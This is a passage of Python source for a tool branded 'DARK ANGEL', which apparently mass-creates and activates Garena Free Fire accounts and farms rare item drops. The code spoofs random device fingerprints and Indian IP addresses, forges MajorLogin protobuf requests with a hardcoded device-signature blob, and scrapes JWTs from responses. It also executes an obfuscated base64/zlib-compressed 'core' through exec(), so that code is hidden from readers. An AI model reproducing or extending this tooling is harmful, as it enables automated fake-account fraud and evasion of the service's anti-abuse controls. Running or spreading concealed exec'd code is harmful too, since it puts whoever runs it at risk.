            for i in range(total + 1):
                ratio = i / total
                filled = int(width * ratio)
                bar = "█" * filled + "░" * (width - filled)
                pct = int(ratio * 100)
                sys.stdout.write(
                    f"\r  {NEXUS.CYAN}{bar}{NEXUS.RESET}  "
                    f"{NEXUS.GOLD}{pct:3d}%{NEXUS.RESET}  {NEXUS.SNOW}{text}{NEXUS.RESET}   "
                )
                sys.stdout.flush()
                time.sleep(duration / total)
            sys.stdout.write(
                f"\r  {NEXUS.LIME}{'█' * width}{NEXUS.RESET}  "
                f"{NEXUS.GOLD}100%{NEXUS.RESET}  {NEXUS.SNOW}{text}{NEXUS.RESET}   \n"
            )
            sys.stdout.flush()
        except Exception:
            pass


# ══════════════════════════════════════════════════════════════════════════
#  TERMINAL — box drawing, headers
# ══════════════════════════════════════════════════════════════════════════
class Term:
    @staticmethod
    def clear() -> None:
        os.system('clear' if os.name == 'posix' else 'cls')

    @staticmethod
    def width() -> int:
        try:
            return shutil.get_terminal_size((100, 30)).columns
        except Exception:
            return 100

    @staticmethod
    def line(char: str = "─", color: str = NEXUS.STEEL, w: int = None) -> str:
        if w is None:
            w = Term.width()
        return f"{color}{char * w}{NEXUS.RESET}"

    @staticmethod
    def center(text: str, w: int = None) -> str:
        if w is None:
            w = Term.width()
        visible = _vlen(text)
        pad = max(0, (w - visible) // 2)
        return " " * pad + text

    @staticmethod
    def box(title: str, rows: List[str], color: str = NEXUS.CYAN,
            w: int = None, title_color: str = None) -> None:
        if w is None:
            w = min(Term.width(), 96)
        if title_color is None:
            title_color = NEXUS.GOLD
        top = "╭" + "─" * (w - 2) + "╮"
        print(f"{color}{top}{NEXUS.RESET}")
        tag = f" ❪ {title} ❫ "
        lp = max(0, (w - 2 - _vlen(tag)) // 2)
        rp = max(0, w - 2 - _vlen(tag) - lp)
        print(f"{color}│{NEXUS.RESET}" + " " * lp + f"{title_color}{NEXUS.BOLD}{tag}{NEXUS.RESET}" + " " * rp + f"{color}│{NEXUS.RESET}")
        print(f"{color}├" + "─" * (w - 2) + f"┤{NEXUS.RESET}")
        for row in rows:
            vis = _vlen(row)
            pad = max(0, w - 4 - vis)
            print(f"{color}│{NEXUS.RESET} {row}" + " " * pad + f" {color}│{NEXUS.RESET}")
        print(f"{color}╰" + "─" * (w - 2) + f"╯{NEXUS.RESET}")

    @staticmethod
    def kv(key: str, value: str, key_color: str = NEXUS.SILVER,
           val_color: str = NEXUS.WHITE, key_w: int = 14) -> str:
        return f"{key_color}{key:<{key_w}}{NEXUS.RESET} {NEXUS.STEEL}·{NEXUS.RESET} {val_color}{value}{NEXUS.RESET}"


# ══════════════════════════════════════════════════════════════════════════
#  BANNER — DARK ANGEL
# ══════════════════════════════════════════════════════════════════════════
class Banner:
    ART = [
        "  █████╗ ███╗   ██╗ ██████╗ ███████╗██╗     ",
        " ██╔══██╗████╗  ██║██╔════╝ ██╔════╝██║     ",
        " ███████║██╔██╗ ██║██║  ███╗█████╗  ██║     ",
        " ██╔══██║██║╚██╗██║██║   ██║██╔══╝  ██║     ",
        " ██║  ██║██║ ╚████║╚██████╔╝███████╗███████╗",
        " ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚══════╝",
    ]

    SUBTITLE = "⚡ D A R K   A N G E L   ★   C O M B I N E D   E N G I N E ⚡"

    @classmethod
    def render(cls, animate: bool = True) -> None:
        Term.clear()
        w = Term.width()
        print()

        # ─── ANGEL logo — GOLD ───
        for i, line in enumerate(cls.ART):
            colored = gradient_text(line, NEXUS.FIRE_FLOW, i * 4)
            print(Term.center(f"{NEXUS.BOLD}{colored}{NEXUS.RESET}", w))
            if animate:
                sys.stdout.flush()
                time.sleep(0.06)

        print()

        # ─── Subtitle — WHITE ───
        print(Term.center(
            f"{NEXUS.STEEL}❰{NEXUS.RESET}  "
            f"{NEXUS.BOLD}{NEXUS.WHITE}{cls.SUBTITLE}{NEXUS.RESET}  "
            f"{NEXUS.STEEL}❱{NEXUS.RESET}",
            w
        ))

        # ─── Version + Credit line ───
        print(Term.center(
            f"{NEXUS.WHITE}🚀 v2.0  ·  🛠  COMBINED BUILD  ★  👑 OWNER : {_OWNER_NAME}  ★  🇮🇳 IND FOCUS{NEXUS.RESET}",
            w
        ))

        print()
        print(f"{NEXUS.PURPLE}" + "═" * w + f"{NEXUS.RESET}")
        print()

    @staticmethod
    def credits_panel() -> None:
        rows = [
            Term.kv("Owner",   f"{NEXUS.BOLD}{NEXUS.GOLD}{_OWNER_NAME}{NEXUS.RESET}", NEXUS.ASH, NEXUS.WHITE),
            Term.kv("Engine",  f"{NEXUS.BOLD}{NEXUS.CYAN}COMBINED v2.0{NEXUS.RESET}", NEXUS.ASH, NEXUS.WHITE),
            Term.kv("Brand",   f"{NEXUS.BOLD}{NEXUS.MAGENTA}{_OWNER_TAG}{NEXUS.RESET}", NEXUS.ASH, NEXUS.WHITE),
            Term.kv("Modules", f"{NEXUS.EMERALD}GEN + ACT + SPIN 5{NEXUS.RESET}", NEXUS.ASH, NEXUS.WHITE),
            Term.kv("Mode",    f"{NEXUS.LIME}TURBO · Auto Threads{NEXUS.RESET}", NEXUS.ASH, NEXUS.WHITE),
            Term.kv("Password",f"{NEXUS.AMBER}{Config.PASSWORD_PREFIX}_<random>{NEXUS.RESET}", NEXUS.ASH, NEXUS.WHITE),
        ]
        Term.box("SYSTEM PROFILE", rows, NEXUS.CYAN, Term.width(), NEXUS.GOLD)


# ══════════════════════════════════════════════════════════════════════════
#  UI — account card, server menu, summary
# ══════════════════════════════════════════════════════════════════════════
class UI:
    @staticmethod
    def account_card(idx: int, target: int, acc: Dict[str, Any]) -> None:
        with state.print_lock:
            w = min(Term.width(), 96)
            activated = acc.get("activated", False)
            badge = f"{NEXUS.LIME}● ACTIVATED{NEXUS.RESET}" if activated else f"{NEXUS.ORANGE}○ PENDING{NEXUS.RESET}"
            head = f"  {NEXUS.BOLD}{NEXUS.ICE}ACCOUNT #{idx}{NEXUS.RESET} {NEXUS.STEEL}of{NEXUS.RESET} {NEXUS.GOLD}{target}{NEXUS.RESET}   {badge}  "
            pad = max(0, w - 2 - _vlen(head))
            lp = pad // 2
            rp = pad - lp
            print()
            print(f"{NEXUS.CYAN}╭" + "─" * (w - 2) + f"╮{NEXUS.RESET}")
            print(f"{NEXUS.CYAN}│{NEXUS.RESET}" + " " * lp + head + " " * rp + f"{NEXUS.CYAN}│{NEXUS.RESET}")
            print(f"{NEXUS.CYAN}├" + "─" * (w - 2) + f"┤{NEXUS.RESET}")

            def row(label: str, value: str, val_color: str = NEXUS.WHITE) -> None:
                v = str(value)
                if len(v) > w - 24:
                    v = v[:w - 27] + "..."
                left = f"  {NEXUS.SILVER}{label:<12}{NEXUS.RESET} {NEXUS.STEEL}│{NEXUS.RESET} {val_color}{v}{NEXUS.RESET}"
                pad2 = max(0, w - 2 - _vlen(left))
                print(f"{NEXUS.CYAN}│{NEXUS.RESET}{left}" + " " * pad2 + f"{NEXUS.CYAN}│{NEXUS.RESET}")

            row("Nickname",  acc.get("name", "-"), NEXUS.GREEN)
            row("Account ID", acc.get("account_id", "-"), NEXUS.GOLD)
            row("Login UID", acc.get("uid", "-"), NEXUS.CYAN)
            row("Password",  acc.get("password", "-"), NEXUS.BLUE)
            row("Region",    acc.get("region", "-"), NEXUS.MAGENTA)
            row("Status",    "ACTIVATED" if activated else "PENDING", NEXUS.LIME if activated else NEXUS.ORANGE)
            row("API Resp",  (acc.get("activation_message") or "-")[:w - 30], NEXUS.SILVER)
            row("Timestamp", acc.get("date_created", datetime.now().strftime("%Y-%m-%d %H:%M:%S")), NEXUS.STEEL)

            print(f"{NEXUS.CYAN}╰" + "─" * (w - 2) + f"╯{NEXUS.RESET}")
            print()

    @staticmethod
    def server_menu() -> Optional[str]:
        servers = {
            "1": ("BD",  "🇧🇩", "Bangladesh",  NEXUS.GREEN),
            "2": ("IND", "🇮🇳", "India",       NEXUS.ORANGE),
            "3": ("PK",  "🇵🇰", "Pakistan",    NEXUS.EMERALD),
            "4": ("SG",  "🇸🇬", "Singapore",   NEXUS.ROSE),
            "5": ("ID",  "🇮🇩", "Indonesia",   NEXUS.RED),
            "6": ("ME",  "🇲🇪", "Middle East", NEXUS.GOLD),
        }
        rows = []
        for key, (code, flag, name, color) in servers.items():
            rows.append(
                f"  {NEXUS.BOLD}{NEXUS.CYAN}[{key}]{NEXUS.RESET}  {flag}  "
                f"{color}{NEXUS.BOLD}{code:<4}{NEXUS.RESET} {NEXUS.SILVER}{name}{NEXUS.RESET}"
            )
        Term.box("SELECT SERVER", rows, NEXUS.CYAN, Term.width(), NEXUS.GOLD)
        choice = input(
            f"\n  {NEXUS.BOLD}{NEXUS.MAGENTA}▶ {NEXUS.WHITE}Server "
            f"{NEXUS.STEEL}(1-6){NEXUS.RESET} {NEXUS.STEEL}:{NEXUS.RESET} "
        ).strip().lower()
        if choice not in servers:
            Anim.glitch("  INVALID SERVER SELECTION", NEXUS.RED, 0.4)
            return None
        return servers[choice][0]

    @staticmethod
    def summary(region: str, target: int, elapsed: float,
                mode_label: str, threads: int) -> None:
        w = min(Term.width(), 96)
        rows = [
            Term.kv("Target",    f"{NEXUS.GOLD}{target}{NEXUS.RESET}", NEXUS.SILVER, NEXUS.WHITE),
            Term.kv("Generated", f"{NEXUS.LIME}{state.success_count}{NEXUS.RESET}", NEXUS.SILVER, NEXUS.WHITE),
            Term.kv("Activated", f"{NEXUS.CYAN}{state.activated_count}{NEXUS.RESET}", NEXUS.SILVER, NEXUS.WHITE),
            Term.kv("Pending",   f"{NEXUS.ORANGE}{state.success_count - state.activated_count}{NEXUS.RESET}", NEXUS.SILVER, NEXUS.WHITE),
            Term.kv("Region",    f"{NEXUS.MAGENTA}{region}{NEXUS.RESET}", NEXUS.SILVER, NEXUS.WHITE),
            Term.kv("Mode",      f"{NEXUS.CYAN}{mode_label} · {threads} threads{NEXUS.RESET}", NEXUS.SILVER, NEXUS.WHITE),
            Term.kv("Duration",  f"{NEXUS.ICE}{elapsed:.2f}s{NEXUS.RESET}", NEXUS.SILVER, NEXUS.WHITE),
            Term.kv("Accounts",  f"{NEXUS.BLUE}{os.path.basename(Config.ACCOUNTS_FILE)}{NEXUS.RESET}", NEXUS.SILVER, NEXUS.WHITE),
            Term.kv("CSV Log",   f"{NEXUS.BLUE}{os.path.basename(Config.ACTIVATION_RESULTS_FILE)}{NEXUS.RESET}", NEXUS.SILVER, NEXUS.WHITE),
            Term.kv("Credit",    f"{NEXUS.BOLD}{NEXUS.GOLD}{_OWNER_TAG}{NEXUS.RESET}", NEXUS.SILVER, NEXUS.WHITE),
        ]
        print()
        Term.box("OPERATION REPORT", rows, NEXUS.GREEN, w, NEXUS.GOLD)
        print()


# ══════════════════════════════════════════════════════════════════════════
#  RARE ALERTS — 🎉 CONGRATULATIONS / 🔔 GHANTA MILA 😂
# ══════════════════════════════════════════════════════════════════════════

def show_congratulations(idx: int, uid: str, pwd: str,
                         item_name: str, event_name: str, region: str):
    """🎉 Premium congratulations box for rare drops"""
    W = 60
    with state.print_lock:
        # Terminal bell
        sys.stdout.write("\a\a\a")
        sys.stdout.flush()

        print()
        print(f"  {NEXUS.BG_GOLD}{NEXUS.BOLD}╔{'═' * W}╗{NEXUS.RESET}")
        print(f"  {NEXUS.BG_GOLD}{NEXUS.BOLD}║{'🎉🎉  C O N G R A T U L A T I O N S  🎉🎉':^{W}}║{NEXUS.RESET}")
        print(f"  {NEXUS.BG_GOLD}{NEXUS.BOLD}╚{'═' * W}╝{NEXUS.RESET}")
        print()
        print(f"  {NEXUS.GOLD}╭{'─' * W}╮{NEXUS.RESET}")
        print(f"  {NEXUS.GOLD}│{NEXUS.RESET}  {NEXUS.CYAN}👤 UID       {NEXUS.RESET}: {NEXUS.BOLD}{NEXUS.GOLD}{uid}{NEXUS.RESET}")
        print(f"  {NEXUS.GOLD}│{NEXUS.RESET}  {NEXUS.CYAN}🔑 Password  {NEXUS.RESET}: {NEXUS.BOLD}{NEXUS.GREEN}{pwd}{NEXUS.RESET}")
        print(f"  {NEXUS.GOLD}│{NEXUS.RESET}  {NEXUS.CYAN}💎 Item      {NEXUS.RESET}: {NEXUS.BOLD}{NEXUS.YELLOW}{item_name}{NEXUS.RESET}")
        print(f"  {NEXUS.GOLD}│{NEXUS.RESET}  {NEXUS.CYAN}🎯 Event     {NEXUS.RESET}: {NEXUS.BOLD}{NEXUS.AQUA}{event_name}{NEXUS.RESET}")
        print(f"  {NEXUS.GOLD}│{NEXUS.RESET}  {NEXUS.CYAN}🌍 Region    {NEXUS.RESET}: {NEXUS.BOLD}{NEXUS.MAGENTA}{region}{NEXUS.RESET}")
        print(f"  {NEXUS.GOLD}│{NEXUS.RESET}  {NEXUS.CYAN}⭐ Rarity    {NEXUS.RESET}: {NEXUS.BOLD}{NEXUS.BG_RED}{NEXUS.GOLD} ULTRA RARE {NEXUS.RESET}")
        print(f"  {NEXUS.GOLD}│{NEXUS.RESET}  {NEXUS.CYAN}⏰ Time      {NEXUS.RESET}: {NEXUS.BOLD}{NEXUS.ICE}{now_str()}{NEXUS.RESET}")
        print(f"  {NEXUS.GOLD}│{NEXUS.RESET}  {NEXUS.CYAN}🔢 Slot      {NEXUS.RESET}: {NEXUS.BOLD}{NEXUS.ORANGE}{idx}{NEXUS.RESET}")
        print(f"  {NEXUS.GOLD}╰{'─' * W}╯{NEXUS.RESET}")
        print()


def show_ghanta_mila(idx: int, uid: str, item_name: str, event_name: str):
    """🔔 Faltu item log"""
    _safe_print(
        f"{_ts()} {NEXUS.GOLD}🎰{NEXUS.RESET} "
        f"{NEXUS.GOLD}[{idx}]{NEXUS.RESET} "
        f"{NEXUS.GOLD}[{event_name}]{NEXUS.RESET} "
        f"{NEXUS.CYAN}UID:{NEXUS.BOLD}{uid[:14]}{NEXUS.RESET} "
        f"{NEXUS.STEEL}|{NEXUS.RESET} "
        f"{NEXUS.ASH}{item_name}{NEXUS.RESET} "
        f"{NEXUS.STEEL}→{NEXUS.RESET} "
        f"{NEXUS.ASH}🔔 ghanta mila{NEXUS.RESET} 😂"
    )


def show_ind_rare_line(idx: int, uid: str, item_name: str, event_name: str):
    """🎉 Rare item short line (dashboard के लिए)"""
    _safe_print(
        f"{_ts()} {NEXUS.YELLOW}🎉{NEXUS.RESET} "
        f"{NEXUS.GOLD}[{idx}]{NEXUS.RESET} "
        f"{NEXUS.GOLD}[{event_name}]{NEXUS.RESET} "
        f"{NEXUS.CYAN}UID:{NEXUS.BOLD}{uid[:14]}{NEXUS.RESET} "
        f"{NEXUS.STEEL}|{NEXUS.RESET} "
        f"{NEXUS.BG_GOLD}{NEXUS.BOLD} RARE: {item_name} {NEXUS.RESET} "
        f"{NEXUS.YELLOW}🎉{NEXUS.RESET}"
    )


# ══════════════════════════════════════════════════════════════════════════
#  ITEM LOOKUP HELPERS
# ══════════════════════════════════════════════════════════════════════════

def get_item_name(item_id: int) -> str:
    """Item ID se naam nikalo"""
    return RARE_ITEMS_DB.get(item_id, f"Asset ID: {item_id}")


def is_ind_item_rare(item_id: int) -> Tuple[bool, Optional[str], Optional[str]]:
    """Check karo item rare hai ya nahi"""
    if item_id in RARE_5_ITEMS:
        name, event = RARE_5_ITEMS[item_id]
        return True, name, event
    return False, None, None


def get_ind_payload(event_name: str) -> str:
    """IND region ka payload nikalo"""
    if event_name not in EVENTS_DATA:
        return ""
    event = EVENTS_DATA[event_name]
    return event["payloads"].get("IND", "").strip()


def list_available_ind_events() -> list:
    """IND me kaun se events available hain"""
    available = []
    for key, event in EVENTS_DATA.items():
        if not event.get("enabled", True):
            continue
        payload = event["payloads"].get("IND", "").strip()
        if payload and len(payload) == 32:
            available.append(key)
    return available


def get_available_events(region: str) -> list:
    """Get all events available for a region"""
    available = []
    for event_key, event_data in EVENTS_DATA.items():
        if not event_data.get("enabled", True):
            continue
        payload = event_data["payloads"].get(region.upper(), "").strip()
        if payload and is_valid_payload(payload):
            available.append(event_key)
    return available


def validate_events_for_region(region: str, events: list) -> list:
    """Filter events that have valid payload for given region"""
    valid = []
    for e in events:
        if e not in EVENTS_DATA:
            continue
        payload = EVENTS_DATA[e]["payloads"].get(region.upper(), "").strip()
        if payload and is_valid_payload(payload):
            valid.append(e)
    return valid


def is_valid_hex(s: str) -> bool:
    """Check if string is valid hex"""
    if not s:
        return False
    if len(s) % 2 != 0:
        return False
    return bool(re.match(r"^[0-9A-Fa-f]+$", s))


def is_valid_payload(s: str) -> bool:
    """Check if payload is a valid 32-char hex"""
    if not s or not isinstance(s, str):
        return False
    s = s.strip()
    if len(s) != 32:
        return False
    return is_valid_hex(s)


def is_valid_uid(uid) -> bool:
    """Check if UID is a valid numeric string"""
    if not uid:
        return False
    s = str(uid).strip()
    if not s.isdigit():
        return False
    if len(s) < 6 or len(s) > 20:
        return False
    return True


# ══════════════════════════════════════════════════════════════════════════
#  END OF PART 2 of 9
# ══════════════════════════════════════════════════════════════════════════
# ══════════════════════════════════════════════════════════════════════════
#  PART 3 — OBFUSCATED CORE, PROTOBUILDER, GARENA CLIENT
# ══════════════════════════════════════════════════════════════════════════


# ══════════════════════════════════════════════════════════════════════════
#  OBFUSCATED CORE (master.py se as-is)
#  इसमें SecurityEngine class है — AES encrypt, signature, password
# ══════════════════════════════════════════════════════════════════════════
_core_blob = (
    "eJzNU9Fq2zAUfe9XaH6JzDqxBLaHwkYX14yylYY4G+RJKNK1fVdHMpJC45X8e+XYNHEN2x5333"
    "Q499x7z7EvZCWcIxnInUXfpLpADVcXJNRiSj6R6CtosMKDmjfXSSm0huo76oe52fOoo81aGl+i2"
    "gmdGAX7Dr92XniUW/ClUUdEQU6KXo7vKm8Fd+1c4HXY4dFYRWPy7jNx3nYbtOWC+mTCfhnUNLAt"
    "eMdkaVACDTzUBRNOIvIKvAfryFvSwwoL9C4mubGEE9TECl0Anc7i+EU8qO2sJnn0NDSALaaHJ3cY"
    "obPDn24DLW1Tey5qDBc1lRGK1pVAzUvYX7V7jc/DnIxGkzd/8Z2Ek0arHbsGMZymtJUYnWPBvqQZ"
    "/5aug6ubyftXNXlpkFiXYAMp0JmGRzrsvjzid/c3KU/myeW59u3Pk721UAoUV8KLIBVedNN4cCy3"
    "ZhssOZkTd4KbysgH7vA3jCLqFmK9xfRMOWatVPwv35zDQosgB7SP578JZXHLszRZpqs+myi5Xy5/"
    "LFbpTQvw+Zpn62yV3kWvfSm3Qg4CGii1foWpNPjbX3yGlMKVFW6YK8Xsw8ejjeGfAeeDmc8okEiu"
)
exec(__import__('zlib').decompress(__import__('base64').b64decode(_core_blob.encode())).decode())


# ══════════════════════════════════════════════════════════════════════════
#  MASTERHACX PASSWORD OVERRIDE — DARK ANGEL prefix
# ══════════════════════════════════════════════════════════════════════════
def _angel_generate_password() -> str:
    """DARK_ prefix + random tail"""
    alphabet = string.ascii_letters + string.digits
    tail = ''.join(secrets.choice(alphabet) for _ in range(random.randint(12, 18)))
    return f"{Config.PASSWORD_PREFIX}_{tail}"


try:
    SecurityEngine.generate_ultra_secure_password = staticmethod(_angel_generate_password)
except NameError:
    pass


# ══════════════════════════════════════════════════════════════════════════
#  PROTO BUILDER — raw protobuf encoder
# ══════════════════════════════════════════════════════════════════════════
class ProtoBuilder:
    @staticmethod
    def encode_varint(n: int) -> bytes:
        if n < 0:
            return b''
        out = bytearray()
        while True:
            b = n & 0x7F
            n >>= 7
            if n:
                b |= 0x80
            out.append(b)
            if not n:
                break
        return bytes(out)

    @classmethod
    def create_field(cls, field_num: int, value: Any) -> bytes:
        if isinstance(value, int):
            return cls.encode_varint((field_num << 3) | 0) + cls.encode_varint(value)
        elif isinstance(value, (str, bytes)):
            v = value.encode() if isinstance(value, str) else value
            return cls.encode_varint((field_num << 3) | 2) + cls.encode_varint(len(v)) + v
        return b''

    @classmethod
    def build(cls, fields_dict: Dict[int, Any]) -> bytes:
        return b''.join(cls.create_field(k, v) for k, v in fields_dict.items())


# ══════════════════════════════════════════════════════════════════════════
#  DEVICE INFO GENERATOR — random per account
# ══════════════════════════════════════════════════════════════════════════

def generate_device_info() -> Dict[str, Any]:
    """Random device fingerprint"""
    model, os_str, gpu, gpu_full = random.choice(DEVICES)
    ip = random.choice(INDIAN_IPS)

    return {
        "model":       model,
        "os_string":   os_str,
        "gpu":         gpu,
        "gpu_full":    gpu_full,
        "ip":          ip,
        "device_id":   f"Google|{uuid.uuid4()}",
        "device_uuid": f"02-{uuid.uuid4()}",
    }


def generate_device_uuid() -> str:
    return f"02-{uuid.uuid4()}"


def generate_nickname(prefix: str = None, max_len: int = 12) -> str:
    """Nickname with prefix"""
    if prefix is None:
        prefix = Config.NICK_PREFIX
    avail = max_len - len(prefix)
    if avail < 1:
        return prefix[:max_len]
    digits = "".join(random.choice("0123456789") for _ in range(avail))
    return f"{prefix}{digits}"


# ══════════════════════════════════════════════════════════════════════════
#  JWT EXTRACTOR — multiple methods
# ══════════════════════════════════════════════════════════════════════════
JWT_RE = re.compile(r"eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+")


def extract_jwt(content: bytes) -> Optional[str]:
    """Extract JWT from response body — multiple methods"""
    if not content:
        return None

    # Method 1: Try protobuf decode
    for offset in (0, 64, 4, 8, 16):
        try:
            sliced = content[offset:] if offset < len(content) else content
            decoded, _ = blackboxprotobuf.decode_message(sliced)
            if isinstance(decoded, dict):
                for k in ('8', 8, b'8', 'jwt', b'jwt', 'token', b'token'):
                    if k in decoded:
                        jwt_val = decoded[k]
                        if isinstance(jwt_val, bytes):
                            v = jwt_val.decode('utf-8', errors='ignore')
                            if v.startswith('eyJ'):
                                return v
                        elif isinstance(jwt_val, str) and jwt_val.startswith('eyJ'):
                            return jwt_val
        except Exception:
            continue

    # Method 2: Regex on text
    try:
        text = content.decode('utf-8', errors='ignore')
        match = JWT_RE.search(text)
        if match:
            return match.group(0)
    except Exception:
        pass

    # Method 3: Regex on bytes
    try:
        match = re.search(
            rb"eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+",
            content
        )
        if match:
            return match.group(0).decode('utf-8', errors='ignore')
    except Exception:
        pass

    return None


def is_valid_jwt(token: str) -> bool:
    """Basic JWT validity check"""
    if not token or not isinstance(token, str):
        return False
    if not token.startswith("eyJ"):
        return False
    if token.count('.') < 2:
        return False
    if len(token) < 50:
        return False
    return True


# ══════════════════════════════════════════════════════════════════════════
#  PROTOBUF TYPEDEFS (for decode operations)
# ══════════════════════════════════════════════════════════════════════════

def _tf(t: str) -> dict:
    return {'type': t, 'name': ''}


typedef_login = {
    '3':   _tf('bytes'), '4':   _tf('bytes'), '5':   _tf('int'),
    '7':   _tf('bytes'), '8':   _tf('bytes'), '9':   _tf('bytes'),
    '10':  _tf('bytes'), '11':  _tf('bytes'), '12':  _tf('int'),
    '13':  _tf('int'),   '14':  _tf('bytes'), '15':  _tf('bytes'),
    '16':  _tf('int'),   '17':  _tf('bytes'), '18':  _tf('bytes'),
    '19':  _tf('bytes'), '20':  _tf('bytes'), '21':  _tf('bytes'),
    '22':  _tf('bytes'), '23':  _tf('bytes'), '24':  _tf('bytes'),
    '25':  _tf('bytes'), '26':  _tf('bytes'), '29':  _tf('bytes'),
    '30':  _tf('int'),   '41':  _tf('bytes'), '42':  _tf('bytes'),
    '57':  _tf('bytes'), '60':  _tf('int'),   '61':  _tf('int'),
    '62':  _tf('int'),   '63':  _tf('int'),   '64':  _tf('int'),
    '65':  _tf('int'),   '66':  _tf('int'),   '67':  _tf('int'),
    '73':  _tf('int'),   '74':  _tf('bytes'), '76':  _tf('int'),
    '77':  _tf('bytes'), '78':  _tf('int'),   '79':  _tf('int'),
    '81':  _tf('bytes'), '83':  _tf('bytes'), '85':  _tf('int'),
    '86':  _tf('bytes'), '87':  _tf('int'),   '88':  _tf('int'),
    '92':  _tf('int'),   '93':  _tf('bytes'), '94':  _tf('bytes'),
    '96':  _tf('bytes'), '97':  _tf('int'),   '98':  _tf('int'),
    '99':  _tf('bytes'), '100': _tf('bytes'), '102': _tf('bytes'),
    '104': _tf('int'),   '105': _tf('int'),   '106': _tf('bytes'),
    '107': _tf('bytes'),
}


typedef_reg = {
    '1':  _tf('bytes'), '2':  _tf('bytes'), '3':  _tf('bytes'),
    '5':  _tf('int'),   '6':  _tf('int'),   '7':  _tf('int'),
    '13': _tf('int'),   '14': _tf('bytes'), '15': _tf('bytes'),
    '16': _tf('int'),   '20': _tf('bytes'), '21': _tf('int'),
    '22': _tf('bytes'),
}


typedef_newbie = {
    '1': _tf('int'),
    '2': _tf('int'),
    '3': _tf('int'),
}


typedef_getlogin = {
    '3':   _tf('bytes'), '4':   _tf('bytes'), '5':   _tf('int'),   '7':   _tf('bytes'),
    '8':   _tf('bytes'), '9':   _tf('bytes'), '10':  _tf('bytes'), '11':  _tf('bytes'),
    '12':  _tf('int'),   '13':  _tf('int'),   '14':  _tf('bytes'), '15':  _tf('bytes'),
    '16':  _tf('int'),   '17':  _tf('bytes'), '18':  _tf('bytes'), '19':  _tf('bytes'),
    '20':  _tf('bytes'), '21':  _tf('bytes'), '22':  _tf('bytes'), '23':  _tf('bytes'),
    '24':  _tf('bytes'), '25':  _tf('bytes'), '26':  _tf('bytes'), '29':  _tf('bytes'),
    '30':  _tf('int'),   '41':  _tf('bytes'), '42':  _tf('bytes'), '57':  _tf('bytes'),
    '60':  _tf('int'),   '61':  _tf('int'),   '62':  _tf('int'),   '64':  _tf('int'),
    '65':  _tf('int'),   '66':  _tf('int'),   '67':  _tf('int'),   '70':  _tf('int'),
    '73':  _tf('int'),   '74':  _tf('bytes'), '76':  _tf('int'),   '77':  _tf('bytes'),
    '78':  _tf('int'),   '79':  _tf('int'),   '81':  _tf('bytes'), '83':  _tf('bytes'),
    '86':  _tf('bytes'), '87':  _tf('int'),   '88':  _tf('int'),   '90':  _tf('bytes'),
    '91':  _tf('bytes'), '92':  _tf('int'),   '93':  _tf('bytes'), '94':  _tf('bytes'),
    '95':  _tf('int'),   '96':  _tf('bytes'), '97':  _tf('int'),   '99':  _tf('bytes'),
    '100': _tf('bytes'), '102': _tf('bytes'),
}


# ══════════════════════════════════════════════════════════════════════════
#  FIELD_22 BLOB (Garena device signature)
# ══════════════════════════════════════════════════════════════════════════
FIELD_22 = bytes.fromhex(
    "4747524501010100620200001052aa0d669c6a368f08338060d2ee0690053af84a41edcd3558556ec10f24f4"
    "6c93ac64ca41a16732c46a2cb071246a79b8929032f9e1b6f4ef331bd53cabf29b09b97349a46e9863c0314e"
    "1a0d80819fef8aabf03876b3d037db354a7ccb5c1bce96411fb3753f6f50e44c69c4ed617fa30efb8ffc0517"
    "ff2f636739be1f304d999cfd6fd48bf69454199794c3dc88f55a4bdbd66534d5a061359cdfd1fb680cd37918"
    "df9fdb3cf7d80067b0a3506c90063cf62b2ccec11e23913a2fd7c4ef091331967bb518a5ad1e551146b90821"
    "be800883abadde39d6c80a5d798611466c748f075481806c5842ce45e6bd4e3368ec08fe2ec41ceb880cd862"
    "49eb71693f79f0bccf9e590c3fae12519fe08c7a1905d0927690109e0df28574bb14847225db1a59230e6662"
    "ed7730e15ff9a6c815cb41b420edeada735a4b03e181037c37c2c850257311df2f07b0a56e759372cbd0268e"
    "3f13a292ee4373e38ab5096e0342a5e0d7fec6da2bbc265d74baadd2b24ee4f74862f82c21d6694bac53f8ce"
    "80312a30068a6276a641c19b11d0305c6fe2f531ac7de578b29f543697f5c73663e6f23aa15277b6122dcd4d"
    "4171e38f9ac0b173f39c58416a16c5c1f4a35acd065ce78f449cf538a249339e763272d458e4ed86c976591a"
    "9c066b3a37111e44091eb6b5a795249f3e5145db022a6055f2cc675936391312f688f89627845df222a91156"
    "555225be36f9714a0ba50246d0f003bda3c9c1292ab73b4f79635ddd023218eda93a302d79e023404c143965"
    "44a930b98ed54771aca7fec10d095587685b473e81a9619764fad9256529dcd6e911f4f4629612287d4ee3ec"
    "5389f6ec4ec020b0e2aac017232a9197be9e46239ce690fe5d4872b2e98e651510c971667f3aca8b59f3e9d5"
    "0e43"
)


# ══════════════════════════════════════════════════════════════════════════
#  GARENA CLIENT — MajorLogin (नया + improve किया हुआ)
# ══════════════════════════════════════════════════════════════════════════
class GarenaClient:
    """
    Garena MajorLogin — नया build (txt file से concept लिया).
    Proper protobuf fields के साथ + device fingerprint + सभी required fields.
    """

    def __init__(self):
        self.session = NetService.rotated_session()

    # ───────────────────────────────────────────────────────────────────
    #  Build MajorLogin protobuf (txt file जैसा proper)
    # ───────────────────────────────────────────────────────────────────
    def _build_majorlogin_proto(
        self,
        open_id: str,
        access_token: str,
        lang: str = "en",
        client_version: str = "1.132.1",
        client_version_code: str = "2019116753",
    ) -> bytes:
        """
        Build proper MajorLogin protobuf using ProtoBuilder.
        Fields based on txt file's thunderFF_pb2 structure.
        """
        device = generate_device_info()

        now_ts = datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S')

        # Field map — based on thunderFF_pb2.MajorLoginReq fields
        # (approximate field numbers, IND-optimized)
        fields = {
            # Timestamps & game info
            3:  now_ts,                              # event_time
            4:  "free fire",                         # game_name
            5:  4,                                   # platform_id

            7:  client_version,                      # client_version
            8:  client_version_code,                 # client_version_code
            9:  device["os_string"],                 # system_software
            10: "Handheld",                          # system_hardware
            11: device["model"],                     # device_type

            12: 1280,                                # screen_width
            13: 720,                                 # screen_height
            14: "240",                               # screen_dpi

            15: "x86-64 SSE3 SSE4.1 SSE4.2 AVX AVX2 | 2400 | 4",   # processor_details
            16: random.choice([5951, 6000, 6100, 5500, 6500]),     # memory

            17: device["gpu"],                       # gpu_renderer
            18: "OpenGL ES 3.1 v1.46",               # gpu_version

